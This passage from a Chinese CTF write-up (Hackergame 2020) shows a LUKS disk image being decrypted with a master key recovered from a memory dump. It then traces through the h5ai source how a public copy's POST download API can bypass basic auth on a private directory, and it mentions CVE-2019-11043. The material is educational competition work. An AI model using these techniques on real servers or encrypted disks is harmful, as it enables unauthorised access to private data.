fa 01 a9 <span class="token number">80</span> <span class="token number">89</span> a3 8f <span class="token number">60</span> 6c <span class="token number">14</span> <span class="token number">86</span> <span class="token number">94</span> e7 a3 <span class="token number">50</span> 9a ac cf c1 <span class="token number">65</span> 06 8e d6 7f <span class="token number">57</span> <span class="token number">15</span> <span class="token number">38</span> 4b <span class="token number">93</span> e5 6a a6
Found AES-256 key schedule at offset 0x1901351c:
e4 <span class="token number">58</span> <span class="token number">16</span> <span class="token number">75</span> c3 f9 <span class="token number">47</span> f7 b5 <span class="token number">37</span> a3 <span class="token function">dd</span> <span class="token number">60</span> <span class="token number">98</span> e4 a5 <span class="token number">89</span> 8b 0a <span class="token number">18</span> c2 b3 b0 f6 <span class="token number">75</span> c6 1d e4 <span class="token number">10</span> 6f c6 a1</code></pre>
<p>用 losetup 将磁盘镜像文件虚拟成 loop 设备。</p>
<p>这里用第三个分区，起始的偏移为 1892352 * 512 = 968884224 bytes。</p>
<blockquote>
<p>循环设备可把文件虚拟成区块设备，籍以模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> losetup --offset <span class="token number">968884224</span> /dev/loop30 roommates_disk_part.img</code></pre>
<p>然后可以用 <code>ls /dev/loop*</code> 看到有 loop30 了。</p>
<p>随意把一行的 AES Key 拿去解密，发现也是提示 </p>
<blockquote>
<p>Cannot read 64 bytes from keyfile key0.</p>
</blockquote>
<p>题目提示 <strong>AES512</strong>，这里解密出来的 AES256 密钥长度不够。于是就得把两个拼一起拿去解密，而且理论上应该是两个连续的密钥拼一起。</p>
<p>然而我就卡这里了。只想到正着拼接，没想到反过来连接。。</p>
<p>参考官方 WP 给的 <a target="_blank" rel="noopener" href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e"><strong>Breaking Full Disk Encryption from a Memory Dump</strong></a> 一文，由于用的是小端序，这里应该反过来拼接。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107202423595.png" alt="参考博客"></p>
<p>试了半天发现是最后两条，而且还出现了两次。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6'</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">&gt;</span> key0</code></pre>
<p>然后用 <code>key0</code> 去解密镜像。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> cryptsetup luksOpen --master-key-file key0 /dev/loop30 decrypted</code></pre>
<p>没有报错，然后再把这个 loop 给挂载上。最后进去拿到 flag。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /mnt/hackergame
<span class="token function">sudo</span> <span class="token function">mount</span> /dev/mapper/decrypted /mnt/hackergame
<span class="token builtin class-name">cd</span> /mnt/hackergame/
<span class="token comment"># ...</span>
<span class="token function">cat</span> flag.txt</code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184050381.png" alt="flag"></p>
<p>最后再取消挂载，卸载 loop 设备。有始有终嘛。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">umount</span> /mnt/hackergame
<span class="token function">sudo</span> losetup -d /dev/loop30
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /mnt/hackergame</code></pre>
<blockquote>
<p>其他 References &amp; Extensive Reading：</p>
<p><a target="_blank" rel="noopener" href="https://raksec.blogspot.com/2016/05/forensics-ctf-challenge-fbios-writeup.html">Forensics CTF challenge - FBiOS writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://g0blin.co.uk/hack-lu-ctf-2015-dr-bob-writeup/">Hack.lu CTF 2015 - Forensics 150: Dr. Bob Writeup（较简单）</a></p>
<p><a target="_blank" rel="noopener" href="http://aes.online-domain-tools.com/">AES – Symmetric Ciphers Online 一个在线的 AES 解密网站</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b58449b43981">迅雷网心云x86版虚拟机硬盘解密</a></p>
</blockquote>
<hr>
<h2 id="超简易的网盘服务器"><a href="#超简易的网盘服务器" class="headerlink" title="超简易的网盘服务器"></a>超简易的网盘服务器</h2><blockquote>
<p>登录了服务器后台的小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a target="_blank" rel="noopener" href="http://202.38.93.111:10120/">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a target="_blank" rel="noopener" href="http://202.38.93.111:10120/Public">/Public</a> 目录来共享文件！”</p>
<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a target="_blank" rel="noopener" href="http://202.38.93.111:10120/">根目录</a>。</p>
</blockquote>
<p>这题老馋了，做了好久才整出来，还是太菜了，我自己爬。</p>
<p>访问 /Public 目录，可以得到 <code>nginx.conf</code> 以及 <code>Dockerfile</code>。</p>
<p>关键代码：</p>
<pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM alpine:latest
EXPOSE 10120
WORKDIR /var/www/html
RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \
    &amp;&amp; apk add nginx supervisor php7-fpm php7-session php7-json php7-gd php7-exif git wget unzip zip\
    &amp;&amp; mkdir -p /var/www/html/Public \
    &amp;&amp; wget https://release.larsjung.de/h5ai/h5ai-0.29.2.zip \
    &amp;&amp; unzip h5ai-0.29.2.zip \
    &amp;&amp; cp -rp /var/www/html/_h5ai  /var/www/html/Public/_h5ai \
    &amp;&amp; rm h5ai-0.29.2.zip \
    &amp;&amp; mkdir /run/nginx

ADD ./supervisord.conf /etc/supervisor/conf.d/supervisord.conf
ADD ./nginx.conf /etc/nginx/nginx.conf
ADD ./php.ini /etc/php7/php.ini
RUN rm /etc/nginx/conf.d/default.conf

RUN chown -R nobody.nobody /var/www/html &amp;&amp; \
  chown -R nobody.nobody /run &amp;&amp; \
  chown -R nobody.nobody /var/lib/nginx &amp;&amp; \
  chown -R nobody.nobody /var/log/nginx &amp;&amp; \
  chown -R nobody.nobody /var/log/php7

USER nobody
ADD --chown=nobody ./flag.txt /var/www/html/
ADD --chown=nobody ./dockerfile ./nginx.conf /var/www/html/Public/

CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]</code></pre>
<p><code>cp -rp /var/www/html/_h5ai  /var/www/html/Public/_h5ai</code>，这里看得出来**有两个 <code>_h5ai</code>**，实际访问也是。</p>
<pre class="language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span><span class="token punctuation">{</span>
    <span class="token comment"># Docker 内部的地址，无关紧要</span>
    <span class="token keyword">listen</span> <span class="token number">10120</span><span class="token punctuation">;</span>
    <span class="token keyword">server_name</span> _<span class="token punctuation">;</span>

    <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>
    <span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token operator">/</span>_h5ai<span class="token operator">/</span>public<span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>

    <span class="token comment"># _h5ai/private 文件夹下的内容是不可直接访问的，设置屏蔽</span>
    <span class="token keyword">location</span> <span class="token operator">~</span> _h5ai<span class="token operator">/</span>private <span class="token punctuation">{</span>
        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span>
    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>
        <span class="token keyword">auth_basic</span> <span class="token string">"easy h5ai. For visitors, please refer to public directory at `/Public!`"</span><span class="token punctuation">;</span>
        <span class="token keyword">auth_basic_user_file</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span>htpasswd<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span>
    <span class="token keyword">location</span> <span class="token operator">/</span>Public <span class="token punctuation">{</span>
        <span class="token keyword">allow</span> all<span class="token punctuation">;</span>
        <span class="token keyword">index</span> <span class="token operator">/</span>Public<span class="token operator">/</span>_h5ai<span class="token operator">/</span>public<span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span>
    <span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span>php$ <span class="token punctuation">{</span>
             <span class="token keyword">fastcgi_pass</span>   <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">9000</span><span class="token punctuation">;</span>
             <span class="token keyword">fastcgi_index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
             <span class="token keyword">fastcgi_param</span>  SCRIPT_FILENAME  <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>
             <span class="token keyword">include</span>        fastcgi_params<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>\<span class="token punctuation">.</span> <span class="token punctuation">{</span>
        <span class="token keyword">log_not_found</span> off<span class="token punctuation">;</span>
        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>（提一句，这个密钥文件说不好还不存在（x</p>
<p>（本地搭建就是这样，但不影响题目。</p>
<p>刚开始还以为是 Nginx 配置问题，可能路径穿越，例如 <code>/Public../</code>，<del>但不知道跑哪去了</del></p>
<p>本地搭建试了试，的确路由到 <code>/Public../</code> 目录下了，但不知道为啥列不出文件，文件下载倒是可以的。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012811728.png" alt="建立目录写入文件"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012726981.png" alt="列不出文件"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012907207.png" alt="能读取文件"></p>
<p>可能是需要设置 <code>alias</code>，开启 <code>autoindex</code>，才会有这个漏洞吧。</p>
<p>再想想，难道是 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuxinmengyi/p/11746193.html">php-fpm在nginx特定环境下的任意代码执行漏洞（CVE-2019-11043）</a>？（GitHub **<a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">phuip-fpizdam</a>**）</p>
<p>看了下也不是。</p>
<p>不行了不行了，感觉不是 nginx 的问题，<strong>得审计源码了</strong>。</p>
<p>根据 Nginx 配置，访问这个 <a target="_blank" rel="noopener" href="http://202.38.93.111:10120/Public/_h5ai/public/index.php">http://202.38.93.111:10120/Public/_h5ai/public/index.php</a> ，发现密码为空，有一些相关的信息。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105011532703.png" alt="config"></p>
<p>把源码下载下来，这个<code>index.php</code>调用了 <code>class-bootstrap.php</code>。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">require_once</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/../private/php/class-bootstrap.php'</span><span class="token punctuation">;</span>
<span class="token class-name static-context">Bootstrap</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><code>class-bootstrap.php</code> 里判断请求来源，判断是 api/info/else？</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Bootstrap'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'autoload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LANG=en_US.UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setlocale</span><span class="token punctuation">(</span><span class="token constant">LC_CTYPE</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'en_US.UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span>@<span class="token function">date_default_timezone_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Session</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$setup</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Setup</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">query_boolean</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Context</span><span class="token punctuation">(</span><span class="token variable">$session</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$setup</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">is_api_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Api</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">is_info_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$public_href</span> <span class="token operator">=</span> <span class="token variable">$setup</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PUBLIC_HREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$x_head_tags</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">get_x_head_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fallback_mode</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/pages/info.php'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$public_href</span> <span class="token operator">=</span> <span class="token variable">$setup</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PUBLIC_HREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$x_head_tags</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">get_x_head_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fallback_mode</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">is_fallback_mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fallback_html</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Fallback</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">get_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/pages/index.php'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p><code>class-context.php</code>:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_api_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">setup</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'post'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>于是只要发个 POST 请求就能调用 API.</p>
<p>试试发现缺参数。</p>
<p>看调用： <code>(new Api($context))-&gt;apply();</code></p>
<p><code>class-api.php</code>:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$supported</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'download'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'login'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'logout'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token function">json_fail</span><span class="token punctuation">(</span><span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token constant">ERR_UNSUPPORTED</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unsupported action'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$supported</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$methodname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'on_'</span> <span class="token operator">.</span> <span class="token variable">$action</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$methodname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">on_download</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token function">json_fail</span><span class="token punctuation">(</span><span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token constant">ERR_DISABLED</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'download disabled'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token operator">-&gt;</span><span class="token function">query_option</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'download.enabled'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$as</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'as'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$base_href</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'baseHref'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hrefs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hrefs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Archive</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Disposition: attachment; filename="'</span> <span class="token operator">.</span> <span class="token variable">$as</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Connection: close'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token variable">$archive</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$base_href</span><span class="token punctuation">,</span> <span class="token variable">$hrefs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token function">json_fail</span><span class="token punctuation">(</span><span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token constant">ERR_FAILED</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'packaging failed'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token variable">$ok</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>我这里用了 <code>download</code> 方法，按照代码依次补上参数就完事了。</p>
<p><code>class-archive.php</code>:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$base_href</span><span class="token punctuation">,</span> <span class="token variable">$hrefs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token operator">-&gt;</span><span class="token function">to_path</span><span class="token punctuation">(</span><span class="token variable">$base_href</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token operator">-&gt;</span><span class="token function">is_managed_path</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dirs</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">add_hrefs</span><span class="token punctuation">(</span><span class="token variable">$hrefs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dirs</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'php-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">add_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">add_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'php-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">php_tar</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dirs</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'shell-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">shell_cmd</span><span class="token punctuation">(</span><span class="token class-name static-context">Archive</span><span class="token operator">::</span><span class="token variable">$TAR_PASSTHRU_CMD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'shell-zip'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">shell_cmd</span><span class="token punctuation">(</span><span class="token class-name static-context">Archive</span><span class="token operator">::</span><span class="token variable">$ZIP_PASSTHRU_CMD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这里就用 <code>shell-zip</code> 好了，其实都行。</p>
